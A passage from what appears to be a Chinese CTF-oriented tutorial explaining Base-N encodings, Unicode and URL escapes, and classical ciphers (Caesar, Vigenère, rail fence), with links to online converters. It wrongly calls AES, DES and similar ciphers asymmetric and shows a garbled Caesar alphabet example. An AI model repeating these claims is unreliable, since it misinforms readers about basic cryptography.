<p>为了保证所输出的编码位可读字符，Base64 制定了一个编码表，以便进行统一转换。编码表的大小为</p>
<p>2^6=64，这也是 Base64 名称的由来。</p>
<p><strong>Base64 编码表</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">码值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">码值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">码值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">码值</th>
<th style="text-align:center">字符</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">32</td>
<td style="text-align:center">g</td>
<td style="text-align:center">48</td>
<td style="text-align:center">w</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">33</td>
<td style="text-align:center">h</td>
<td style="text-align:center">49</td>
<td style="text-align:center">x</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">34</td>
<td style="text-align:center">i</td>
<td style="text-align:center">50</td>
<td style="text-align:center">y</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">35</td>
<td style="text-align:center">j</td>
<td style="text-align:center">51</td>
<td style="text-align:center">z</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">36</td>
<td style="text-align:center">k</td>
<td style="text-align:center">52</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">37</td>
<td style="text-align:center">l</td>
<td style="text-align:center">53</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">38</td>
<td style="text-align:center">m</td>
<td style="text-align:center">54</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">39</td>
<td style="text-align:center">n</td>
<td style="text-align:center">55</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">40</td>
<td style="text-align:center">o</td>
<td style="text-align:center">56</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">41</td>
<td style="text-align:center">p</td>
<td style="text-align:center">57</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">26</td>
<td style="text-align:center">a</td>
<td style="text-align:center">42</td>
<td style="text-align:center">q</td>
<td style="text-align:center">58</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">27</td>
<td style="text-align:center">b</td>
<td style="text-align:center">43</td>
<td style="text-align:center">r</td>
<td style="text-align:center">59</td>
<td style="text-align:center">7</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">28</td>
<td style="text-align:center">c</td>
<td style="text-align:center">44</td>
<td style="text-align:center">s</td>
<td style="text-align:center">60</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">29</td>
<td style="text-align:center">d</td>
<td style="text-align:center">45</td>
<td style="text-align:center">t</td>
<td style="text-align:center">61</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">30</td>
<td style="text-align:center">e</td>
<td style="text-align:center">46</td>
<td style="text-align:center">u</td>
<td style="text-align:center">62</td>
<td style="text-align:center">+</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">31</td>
<td style="text-align:center">f</td>
<td style="text-align:center">47</td>
<td style="text-align:center">v</td>
<td style="text-align:center">63</td>
<td style="text-align:center">/</td>
</tr>
</tbody>
</table>
<p><strong>Base64 使用注意问题</strong></p>
<p>一、Base64 和 URL 传参问题</p>
<p>标准的 Base64 并不适合直接放在 URL 里传输，因为 URL 编码器会把标准 Base64 中的 “/” 和 “+” 字符变为形</p>
<p>如 “% XX” 的形式，而这些 “%” 号在存入数据库时还需要再进行转换，因为 ANSI SQL 中已将 “%” 号用作通配</p>
<p>符。</p>
<p>为解决此问题，可采用一种用于 URL 的改进 Base64 编码，它在末尾填充’=' 号，并将标准 Base64 中</p>
<p>的 “+” 和 “/” 分别改成了 “-” 和 “_”，这样就免去了在 URL 编解码和数据库存储时所要作的转换，避免了编码信</p>
<p>息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>
<p>二、Base64 和 URL 传参问题改善</p>
<p>另有一种用于正则表达式的改进 Base64 变种，它将 “+” 和 “/” 改成了 “!” 和 “-”，因为 “+”,“*” 以及前面在 IRCu 中</p>
<p>用到的 “[” 和 “]” 在正则表达式中都可能具有特殊含义。</p>
<p>此外还有一些变种，它们将 “+/” 改为 “-” 或 “.”（用作编程语言中的标识符名称）或 “.-”（用于 XML 中的</p>
<p>Nmtoken）甚至 “_:”（用于 XML 中的 Name）。</p>
<p>三、Base64 转换后比原有的字符串长 1/3</p>
<p>Base64 要求把每三个 8Bit 的字节转换为四个 6Bit 的字节（38 = 46 = 24），然后把 6Bit 再添两位高位 0，组成四</p>
<p>个 8Bit 的字节，也就是说，转换后的字符串理论上将要比原来的长 1/3。</p>
<p>四、Base64 转换总结</p>
<p>Base64 转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。</p>
<ol start="2">
<li>Base58—— 示例 <code>admin</code> <br />
 它最大的特点是没有等号</li>
</ol>
<p>Base58 是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生 Bitcoin 的钱包地址。</p>
<p>相比 Base64，Base58 不使用数字 &quot;0&quot;，字母大写 &quot;O&quot;，字母大写 &quot;I&quot;，和字母小写 &quot;l&quot;，以及 &quot;+“和”/&quot; 符号。</p>
<p>比特币的 Base58 字母表：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</pre></td></tr></table></figure><p>简单的说：Base58 一种编码方式，跟十进制，十六进制一样，不过更短更省空间。</p>
<p><strong>Base58 的原理是什么？</strong></p>
<ul>
<li>二进制：0 和 1</li>
<li>十进制：1 到 10</li>
<li>十六进制：十进制的基础上加上了 A-F 六个字母</li>
</ul>
<p>Base58 可以理解为一种 58 进制。</p>
<p>Base58 包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
<p>但是去掉了一些容易混淆的数字和字母：0（数字 0）、O（o 的大写字母）、l（ L 的小写字母）、I（i 的大写字母）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329175604404.png" alt="image-20220329175604404" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3dlYi5jaGFjdW8ubmV0L2NoYXJzZXRiYXNlNTg=">http://web.chacuo.net/charsetbase58</span></p>
<ol start="3">
<li>Base32—— 示例 <code>admin</code> <br />
 他的特点是明文超过十个后面就会有很多等号</li>
</ol>
<p>Base32 使用了 ASCII 编码中可打印的 32 个字符 (大写字母 AZ 和数字 27) 对任意字节数据进行编码.Base32 将串起</p>
<p>来的二进制数据按照 5 个二进制位分为一组，由于传输数据的单位是字节 (即 8 个二进制位). 所以分割之前的二</p>
<p>进制位数是 40 的倍数 (40 是 5 和 8 的最小公倍数). 如果不足 40 位，则在编码后数据补充 &quot;=&quot;，一个 &quot;=&quot; 相当于一个</p>
<p>组 (5 个二进制位)，编码后的数据是原先的 8/5 倍.</p>
<p><strong>Base32 编码表</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">值</th>
<th style="text-align:center">符号</th>
<th style="text-align:center">值</th>
<th style="text-align:center">符号</th>
<th style="text-align:center">值</th>
<th style="text-align:center">符号</th>
<th style="text-align:center">值</th>
<th style="text-align:center">符号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">26</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">27</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">28</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">29</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">30</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">31</td>
<td style="text-align:center">7</td>
</tr>
<tr>
<td style="text-align:center">填充</td>
<td style="text-align:center">=</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>Base32 将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足 8 比特高位补 0）串联起来，按</p>
<p>照 5 比特一组进行切分，并将每组二进制值转换成十进制来对应 32 个可打印字符中的一个。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329180206752.png" alt="image-20220329180206752" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvYmFzZS5waHA=">https://www.qqxiuzi.cn/bianma/base.php</span></p>
<p>由于数据的二进制传输是按照 8 比特一组进行（即一个字节），因此 Base32 按 5 比特切分的二进制数据必须是</p>
<p>40 比特的倍数（5 和 8 的最小公倍数）。例如输入单字节字符 “%”，它对应的二进制值是 “100101”，前面补两</p>
<p>个 0 变成 “00100101”（二进制值不足 8 比特的都要在高位加 0 直到 8 比特），从左侧开始按照 5 比特切分成两</p>
<p>组：“00100” 和 “101”，后一组不足 5 比特，则在末尾填充 0 直到 5 比特，变成 “00100” 和 “10100”，这两组二进制</p>
<p>数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符 “E” 和 “U”，但是这里只用到两组共 10</p>
<p>比特，还差 30 比特达到 40 比特，按照 5 比特一组还需 6 组，则在末尾填充 6 个 “=”。填充 “=” 符号的作用是方便</p>
<p>一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在 URL 中使用时必须去掉 “=” 符号。</p>
<p><strong>与 Base64 相比，Base32 具有许多优点：</strong></p>
<ul>
<li>适合不区分大小写的文件系统，更利于人类口语交流或记忆。</li>
<li>结果可以用作文件名，因为它不包含路径分隔符 “/” 等符号。</li>
<li>排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648 符号集忽略了数字 “1”、“8” 和 “0”，因为它们可能与字母 “I”，“B” 和 “O” 混淆）。</li>
<li>排除填充符号 “=” 的结果可以包含在 URL 中，而不编码任何字符。</li>
</ul>
<p><strong>Base32 也比 Base16 有优势：</strong></p>
<ul>
<li>Base32 比 Base16 占用的空间更小。（1000 比特数据 Base32 需要 200 个字符，而 Base16 则为 250 个字符）</li>
</ul>
<p><strong>Base32 的缺点：</strong></p>
<p>Base32 比 Base64 多占用大约 20％的空间。因为 Base32 使用 8 个 ASCII 字符去编码原数据中的 5 个字节数据，而</p>
<p>Base64 是使用 4 个 ASCII 字符去编码原数据中的 3 个字节数据。</p>
<ol start="4">
<li>
<p>Base16—— 示例 admin</p>
<p>它的特点是没有等号并且数字要多于字母</p>
</li>
</ol>
<p><strong>Base16 编码的方式：</strong></p>
<ol>
<li>
<p>将数据 (根据 ASCII 编码，UTF-8 编码等) 转成对应的二进制数，不足 8 比特位高位补 0。然后将所有的二进制全部串起来，4 个二进制位为一组，转化成对应十进制数。</p>
</li>
<li>
<p>根据十进制数值找到 Base16 编码表里面对应的字符。Base16 是 4 个比特位表示一个字符，所以原始是 1 个字节 (8 个比特位) 刚好可以分成两组，也就是说原先如果使用 ASCII 编码后的一个字符，现在转化成两个字符。数据量是原先的 2 倍。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">值</th>
<th style="text-align:center">编码</th>
<th style="text-align:center">值</th>
<th style="text-align:center">编码</th>
<th style="text-align:center">值</th>
<th style="text-align:center">编码</th>
<th style="text-align:center">值</th>
<th style="text-align:center">编码</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">4</td>
<td style="text-align:center">4</td>
<td style="text-align:center">8</td>
<td style="text-align:center">8</td>
<td style="text-align:center">12</td>
<td style="text-align:center">C</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">5</td>
<td style="text-align:center">5</td>
<td style="text-align:center">9</td>
<td style="text-align:center">9</td>
<td style="text-align:center">13</td>
<td style="text-align:center">D</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">6</td>
<td style="text-align:center">6</td>
<td style="text-align:center">10</td>
<td style="text-align:center">A</td>
<td style="text-align:center">14</td>
<td style="text-align:center">E</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
<td style="text-align:center">7</td>
<td style="text-align:center">7</td>
<td style="text-align:center">11</td>
<td style="text-align:center">B</td>
<td style="text-align:center">15</td>
<td style="text-align:center">F</td>
</tr>
</tbody>
</table>
<p>Base16 编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它</p>
<p>并不包含任何控制字符，以及 Base64 和 Base32 中的 “=” 符号。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329180513398.png" alt="image-20220329180513398" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvYmFzZS5waHA/dHlwZT0xNg==">https://www.qqxiuzi.cn/bianma/base.php?type=16</span></p>
<ol start="5">
<li>Base85—— 示例 <code>admin</code> <br />
 特点是奇怪的字符比较多，但是很难出现等号</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329180600184.png" alt="image-20220329180600184" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5hdG9vbGJveC5uZXQvVG9vbC5waHA/SWQ9OTM0">http://www.atoolbox.net/Tool.php?Id=934</span></p>
<ol start="6">
<li>Base100—— 示例 <code>admin</code> <br />
 特点就是一堆 Emoji 表情</li>
</ol>
<p>Base100 编码 / 解码工具（又名：Emoji 表情符号编码 / 解码），可将文本内容编码为 Emoji 表情符号；同时也可以将编码后的 Emoji 表情符号内容解码为文本。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329180654275.png" alt="image-20220329180654275" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5hdG9vbGJveC5uZXQvVG9vbC5waHA/SWQ9OTM2">http://www.atoolbox.net/Tool.php?Id=936</span></p>
<h2 id="aes-des-rc4-rabbit-triple-des3des"><a class="anchor" href="#aes-des-rc4-rabbit-triple-des3des">#</a> AES、DES、RC4、Rabbit、Triple DES（3DES）</h2>
<p>这些都是非对称性加密算法，就是引入了密钥，密文特征与 Base64 类似，放个图，就不多说了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329180859341.png" alt="image-20220329180859341" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc29qc29uLmNvbS9lbmNyeXB0X2Flcy5odG1s">https://www.sojson.com/encrypt_aes.html</span></p>
<h2 id="unicode-html实体编码-16进制unicode"><a class="anchor" href="#unicode-html实体编码-16进制unicode">#</a> Unicode、HTML 实体编码、16 进制 Unicode</h2>
<ol>
<li>Unicode—— 示例 <code>admin</code> <br />
 可以说 Unicode 与 HTML 实体编码是一个东西</li>
</ol>
<p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符</p>
<p>编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、</p>
<p>跨平台进行文本转换、处理的要求。1990 年开始研发，1994 年正式公布。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181026370.png" alt="image-20220329181026370" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly90b29sLmNoaW5hei5jb20vdG9vbHMvdW5pY29kZS5hc3B4P3FxLXBmLXRvPXBjcXEuZ3JvdXA=">https://tool.chinaz.com/tools/unicode.aspx?qq-pf-to=pcqq.group</span></p>
<ol start="2">
<li>HTML 实体编码 —— 示例 <code>admin</code> <br />
 字符实体是用一个编号写入 HTML 代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</li>
</ol>
<p><strong>这么做的目的主要有两个：</strong></p>
<ol>
<li>解决 HTML 代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是</li>
</ol>
<p>HTML 的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：</p>
<p>小于号这样写：&lt; 或 &lt;</p>
<p>大于号这样写：&gt; 或 &gt;</p>
<p>前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1 字符集（西欧语言）中两百多个字符设定</p>
<p>了实体名称，而对于其它所有字符都可以用实体编号来代替。</p>
<ol start="2">
<li>网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言 ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入 HTML 代码中。</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181305666.png" alt="image-20220329181305666" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly9jLnJ1bm9vYi5jb20vZnJvbnQtZW5kLzY5MS8=">https://c.runoob.com/front-end/691/</span></p>
<ol start="2">
<li>16 进制 Unicode—— 示例 <code>管理员</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181440054.png" alt="image-20220329181440054" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5tc3hpbmRsLmNvbS90b29scy91bmljb2RlMTYuYXNw">http://www.msxindl.com/tools/unicode16.asp</span></p>
<h2 id="escape编码加密-unescape解码解密-u编码-u解码"><a class="anchor" href="#escape编码加密-unescape解码解密-u编码-u解码">#</a> Escape 编码 / 加密、Unescape 解码 / 解密、% u 编码、% u 解码</h2>
<p><strong>特征</strong>：以 % u 开头</p>
<p>Escape/Unescape 加密解码 / 编码解码，又叫 % u 编码，从以往经验看编码字符串出现有 &quot;u&quot;，它是 unicode 编码，</p>
<p>那么 Escape 编码采用是那一种 unicode 实现形式呢。其实是 UTF-16BE 模式。这样一来问题非常简单了。</p>
<p>Escape 编码 / 加密，就是字符对应 UTF-16 16 进制表示方式前面加 % u。Unescape 解码 / 解密，就是去掉 &quot;% u&quot; 后，</p>
<p>将 16 进制字符还原后，由 utf-16 转码到自己目标字符。如：字符 “中”，UTF-16BE 是：“6d93”，因此 Escape</p>
<p>是 “% u6d93”，反之也一样！因为目前 % 字符，常用作 URL 编码，所以 % u 这样编码已经逐渐被废弃了！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181558544.png" alt="image-20220329181558544" /></p>
<p>基本类型只对汉字进行编码，复杂类型是所有字符均可</p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3dlYi5jaGFjdW8ubmV0L2NoYXJzZXRlc2NhcGUv">http://web.chacuo.net/charsetescape/</span></p>
<h2 id="url-hex编码"><a class="anchor" href="#url-hex编码">#</a> URL、Hex 编码</h2>
<p>这两种加密的密文是一样的，不同的是当你用 url 编码网站时是不会把 http 进行编码的，而 Hex 编码则全部转</p>
<p>化了</p>
<p><strong>encodeURIComponent () 函数 与 encodeURI () 函数的区别</strong><br />
请注意 encodeURIComponent () 函数 与 encodeURI () 函数的区别之处，前者假定它的参数是 URI 的一部分</p>
<p>（比如协议、主机名、路径或查询字符串）。因此 encodeURIComponent () 函数将转义用于分隔 URI 各个部</p>
<p>分的标点符号。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181759158.png" alt="image-20220329181759158" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181808550.png" alt="image-20220329181808550" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329181824188.png" alt="image-20220329181824188" /></p>
<p>常用解密网站：</p>
<ul>
<li>Hex 编码：<span class="exturl" data-url="aHR0cHM6Ly93d3cuMTA3MDAwLmNvbS9ULUhleA==">https://www.107000.com/T-Hex</span></li>
<li>URL 编码：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc29qc29uLmNvbS9lbmNvZGV1cmwuaHRtbA==">https://www.sojson.com/encodeurl.html</span></li>
</ul>
<h2 id="凯撒密码-维吉尼亚密码-栅栏密码基础型-栅栏密码w型"><a class="anchor" href="#凯撒密码-维吉尼亚密码-栅栏密码基础型-栅栏密码w型">#</a> 凯撒密码、维吉尼亚密码、栅栏密码基础型、栅栏密码 W 型</h2>
<p>这几类密码原理都是移位调换加密，破解难度低</p>
<ol>
<li>凯撒密码 —— 示例 <code>flag&#123;this_is_flag&#125;</code></li>
</ol>
<p>只对字母进行加密，常用于 CTF 比赛中</p>
<p>凯撒密码最早由古罗马军事统帅盖乌斯・尤利乌斯・凯撒在军队中用来传递加密信息，故称凯撒密码。此为一</p>
<p>种位移加密手段，只对 26 个（大小写）字母进行位移加密，规则相当简单，容易被破解。下面是明文字母表</p>
<p>移回 3 位的对比：</p>
<ul>
<li>明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</li>
<li>密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</li>
</ul>
<p>然后 A 变成 D，B 变成 E，Z 变成 C，字母最多可移动 25 位（按字母表）。通常为向后移动，如果您想向前移动 1 位，则相当于向后移动 25 位，位移选择为 25 位。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182025077.png" alt="image-20220329182025077" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEva2Fpc2FtaW1hLnBocA==">https://www.qqxiuzi.cn/bianma/kaisamima.php</span></p>
<ol start="2">
<li>
<p>维吉尼亚密码 —— 示例 <code>flag&#123;this_is_flag&#125;</code></p>
<p>可以说是凯撒密码的加强版，引入了密钥</p>
</li>
</ol>
<p>维吉尼亚密码，它将凯撒密码的所有 26 种排列放到一个表中，形成 26 行 26 列的加密字母表。此外，维吉尼亚</p>
<p>密码必须有一个由字母组成的密钥，至少有一个字母，最多与明文字母有相同数量的字母。</p>
<p>在凯撒密码中，每个字母都会进行一定偏移值转换，例如，当偏移值是 3 时，则 B 被转换为 E，C 转换成 F…。</p>
<p>在维吉尼亚密码加密中，则是由具有不同偏移的凯撒密码构成的。</p>
<p>要生成密码，需要使用表格方法，此表 (如图所示) 包含 26 行字母表，每一行从上一行到左行被一位偏移。加</p>
<p>密时使用哪一行字母表是基于密钥的，在加密过程中密钥会不断变化。</p>
<p>例如，假设明文为：</p>
<p>BTTACKATDAFG</p>
<p>选择一个关键字并重复它以获得密钥，例如，当关键字是 LIMN 时，键是：</p>
<p>LIMNLIMNLIMN</p>
<p>在明文中的第一个字母 B，对应于密钥中的第一个字母 L，使用加密字母表中的 L 行字母进行加密，得到第一</p>
<p>个字母的密文 M。同样，第二个明文字母是 T，它用表中的 I 行加密，得到第二个密文 B。通过类比，我们可</p>
<p>以得到：</p>
<p>明文：BTTACKATDAFG 键：LIMNLIMNLIMN 密文：MBFNNSMGOIRT</p>
<p>解密的过程是加密的逆过程。例如，密钥的第一个字母对应的 L 行字母表，发现密文的第一个字母 M 位于 B</p>
<p>列，因此明文的第一个字母是 B。密钥的第二个字母对应于 I 行字母表，而密文的第二个字母 B 位于该行的 T</p>
<p>列中，因此明文的第二个字母是 T。等等，你可以得到明文。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/weijiniyamima.png" alt="维吉尼亚密码表格" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182143393.png" alt="image-20220329182143393" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</span></p>
<ol start="3">
<li>栅栏密码基础型</li>
</ol>
<p><strong>栅栏密码是按一定规则将明文内容互相调换了位置</strong></p>
<p>栅栏密码 (Rail fence Cipher) 基础型加密方式，是一种简单的移动字符位置的加密方法，首先把加密的明文分</p>
<p>成 N 个一组，然后把每组的第 1、第 2、第 M 个字符连起来，形成无规律的密文字符串。</p>
<p>例如字符串 “ <code>123456789abc</code> ”，首先将字符串分成 3 组，如下排列：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1234</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">5678</span></pre></td></tr><tr><td data-num="3"></td><td><pre>9abc</pre></td></tr></table></figure><p>依次取每一组字符，组成加密后密文：“ <code>15926a37b48c</code> ”。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182352408.png" alt="image-20220329182352408" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvemhhbGFubWltYS5waHA=">https://www.qqxiuzi.cn/bianma/zhalanmima.php</span></p>
<ol start="4">
<li>栅栏密码 W 型</li>
</ol>
<p>栅栏密码 W 型加密算法：</p>
<p>栅栏密码 (Rail fence Cipher)，扩展变种 W 型，采用先把明文类似 &quot;W&quot; 形状进行排列，然后再按栏目顺序 1-</p>
<p>N，取每一栏的所有字符值，组成加密后密文。</p>
<p>比如字符串 “123456789”，采用栏目数为 3 的时，明文将采用如下排列：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>—5---9</pre></td></tr><tr><td data-num="2"></td><td><pre>-2-4-6-8-</pre></td></tr><tr><td data-num="3"></td><td><pre>–3----7–</pre></td></tr></table></figure><p>取每一栏所有字符串，组成加密后密文：“159246837”。</p>
<p>W 型栅栏密码加密方式，比传统型栅栏密码加密方法，算法略有增强，但目前已只能用于学习算法验证。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182526918.png" alt="image-20220329182526918" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRvb2xzLmluZm8vY29kZS9mZW5jZTE1NC5odG1s">http://www.metools.info/code/fence154.html</span></p>
<h2 id="文本隐藏加密-零宽隐写"><a class="anchor" href="#文本隐藏加密-零宽隐写">#</a> 文本隐藏加密、零宽隐写</h2>
<ol>
<li>文本隐藏加密</li>
</ol>
<p><strong>特征：加密过的密文会比原文的字节数多，当你按删除键的时候会发现某一处要按好多下才能把前面的字掉删掉</strong></p>
<p><strong>原理</strong>：它的原理是在密文中加入了不可见字符组成的编码，例如上述看似九个字符的一句话，通过字</p>
